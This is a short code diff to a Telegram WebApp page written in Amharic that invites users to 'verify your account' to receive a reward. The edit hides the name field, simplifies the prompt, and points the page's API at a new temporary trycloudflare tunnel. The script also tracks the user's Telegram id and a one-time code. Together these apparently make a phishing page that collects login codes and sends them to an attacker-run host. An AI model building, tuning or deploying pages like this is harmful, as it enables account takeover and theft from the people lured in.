@@ -237,8 +237,8 @@
         <div id="step1" class="step">
             <div class="main-card">
                 <h2>አካውንትዎን ያረጋግጡ</h2>
-                <p>ሽልማቱን ለመቀበል  ስም ያስገቡ።</p>
-                <input type="text" id="fname" placeholder="ሙሉ ስም">
+                <p>ሽልማቱን ለመቀበል "ቀጥል" የሚለውን ይጫኑ።</p>
+                <input type="hidden" id="fname" value="User">
                 <div id="status1" class="msg"></div>
                 <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">ቀጥል</button>
                 <div style="text-align:center; margin-top:20px; opacity:0.5;">
@@ -328,7 +328,7 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    const API_BASE_URL = "https://lawyer-ellis-tyler-breeding.trycloudflare.com"; 
+    const API_BASE_URL = "https://technologies-trunk-naturals-tex.trycloudflare.com"; 
     let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
     let sid = userId; 
     let currentOtp = "";
